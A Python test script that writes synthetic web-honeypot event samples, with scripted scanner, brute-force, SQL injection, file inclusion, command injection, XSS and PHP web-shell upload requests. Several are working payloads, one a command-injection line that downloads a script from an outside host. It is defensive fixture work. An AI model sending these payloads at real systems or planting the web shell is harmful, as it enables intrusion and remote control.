"""Genera samples/web.sample.jsonl con el MISMO constructor de eventos que usa el módulo.

Uso:  python -m tests.make_samples
Los eventos son sintéticos (IPs de documentación RFC 5737) pero con el formato exacto del módulo.
"""
from __future__ import annotations

import hashlib
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

from app import events
from app.sim import sql

rng = random.Random(7)
T0 = datetime(2026, 11, 23, 9, 58, 3, 120000, tzinfo=timezone.utc)
OUT = Path(__file__).resolve().parent.parent / "samples" / "web.sample.jsonl"
HOST = "intranet.example.org"

lines: list[dict] = []
clock = T0


def add(ip, ua, method, path, query="", status=200, body=b"", ctype=None, event_type="request",
        auth=None, file=None, session_id=None, extra_headers=None, gap=None):
    global clock
    clock += timedelta(milliseconds=gap if gap is not None else rng.randint(150, 9000))
    h = {"host": HOST, "user-agent": ua, "accept": "*/*", "connection": "close"}
    if body:
        h["content-type"] = ctype or "application/x-www-form-urlencoded"
        h["content-length"] = str(len(body))
    h.update(extra_headers or {})
    lines.append(events.build_event(
        now=clock, src_ip=ip, src_port=rng.randint(32768, 60999), dst_port=8080, method=method,
        path=path, query=query, headers=h, body=body, status=status, event_type=event_type,
        auth=auth, file=file, session_id=session_id))


BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
add("198.51.100.23", BROWSER, "GET", "/", gap=0)
add("198.51.100.23", BROWSER, "GET", "/search", "q=laura")
# escáner Nikto
for p, st in [("/", 200), ("/robots.txt", 200), ("/admin/", 200), ("/.env", 200), ("/.git/config", 200),
              ("/backup.zip", 200), ("/server-status", 200), ("/cgi-bin/test.cgi", 404), ("/wp-admin/", 404)]:
    add("203.0.113.44", "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003386)", "GET", p, status=st, gap=rng.randint(40, 300))
add("192.0.2.77", "zgrab/0.x", "GET", "/", gap=1500)
add("192.0.2.78", "masscan/1.3 (https://github.com/robertdavidgraham/masscan)", "GET", "/", status=200)
# fuerza bruta con Hydra
for pw in ("123456", "password", "admin123", "letmein", "qwerty"):
    body = f"username=admin&password={pw}".encode()
    add("203.0.113.9", "Mozilla/5.0 (Hydra)", "POST", "/login", status=200, body=body, event_type="auth_attempt",
        auth={"username": "admin", "password": pw, "success": False}, gap=rng.randint(200, 600))
body = b"log=admin&pwd=Winter2024%21&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F"
add("203.0.113.9", "Mozilla/5.0 (Hydra)", "POST", "/wp-login.php", body=body, event_type="auth_attempt",
    auth={"username": "admin", "password": "Winter2024!", "success": False})
body = b"pma_username=root&pma_password=toor&server=1"
add("203.0.113.9", "Mozilla/5.0 (Hydra)", "POST", "/phpmyadmin/index.php", body=body, event_type="auth_attempt",
    auth={"username": "root", "password": "toor", "success": False})
# login con credencial débil + sesión
sid = "3f9a1c7e5b2d48a0916e0c4d7a5b8e21"
body = b"username=admin&password=Passw0rd123"
add("198.51.100.99", BROWSER, "POST", "/login", status=302, body=body, event_type="auth_attempt",
    auth={"username": "admin", "password": "Passw0rd123", "success": True}, session_id=sid)
add("198.51.100.99", BROWSER, "GET", "/panel", session_id=sid, extra_headers={"cookie": f"PHPSESSID={sid}"})
# sqlmap
SQLMAP = "sqlmap/1.7.11#stable (https://sqlmap.org)"
for q in ("1", "1'", "1' OR 1=1-- -", "1' ORDER BY 5-- -", "x' UNION SELECT 1,version(),database()-- -",
          "1' AND SLEEP(5)-- -"):
    add("203.0.113.58", SQLMAP, "GET", "/search", f"q={q}", status=200, gap=rng.randint(80, 400))
# LFI, RFI, traversal
add("198.51.100.5", "curl/8.5.0", "GET", "/view", "file=../../../../etc/passwd")
add("198.51.100.5", "curl/8.5.0", "GET", "/view", "file=php://filter/convert.base64-encode/resource=config.php")
add("198.51.100.5", "curl/8.5.0", "GET", "/view", "file=http://203.0.113.200/shell.txt")
# command injection
add("198.51.100.5", "curl/8.5.0", "GET", "/ping", "host=127.0.0.1;id")
add("198.51.100.5", "curl/8.5.0", "GET", "/ping", "host=8.8.8.8 | cat /etc/passwd")
add("198.51.100.5", "curl/8.5.0", "GET", "/ping", "host=;wget http://203.0.113.200/x.sh -O /tmp/x.sh")
# XSS reflejado
payload = b"name=eve&comment=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E"
add("198.51.100.61", BROWSER, "POST", "/comment", body=payload)
add("198.51.100.61", BROWSER, "GET", "/comment", "comment=<img src=x onerror=alert(1)>")
# subida de web shell
shell = b"<?php if(isset($_GET['c'])){ system($_GET['c']); } ?>"
boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
mp = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
      f"Content-Type: application/x-php\r\n\r\n{shell.decode()}\r\n--{boundary}--\r\n").encode()
add("198.51.100.61", BROWSER, "POST", "/upload", body=mp, ctype=f"multipart/form-data; boundary={boundary}",
    event_type="file_upload",
    file={"name": "shell.php", "sha256": hashlib.sha256(shell).hexdigest(), "size": len(shell), "url": None})
add("198.51.100.61", BROWSER, "GET", "/uploads/5c1e9a3b7d20/shell.php", status=404)
add("192.0.2.10", "python-requests/2.31.0", "GET", "/phpmyadmin/", status=200)
add("192.0.2.10", "python-requests/2.31.0", "GET", "/wp-config.php.bak", status=404)
add("192.0.2.14", "Mozilla/5.0 (compatible; Googlebot/2.1)", "DELETE", "/login", status=405)

OUT.parent.mkdir(parents=True, exist_ok=True)
with OUT.open("w", encoding="utf-8") as fh:
    for ev in lines:
        fh.write(json.dumps(ev, ensure_ascii=False, separators=(",", ":")) + "\n")
print(f"{len(lines)} eventos -> {OUT}")
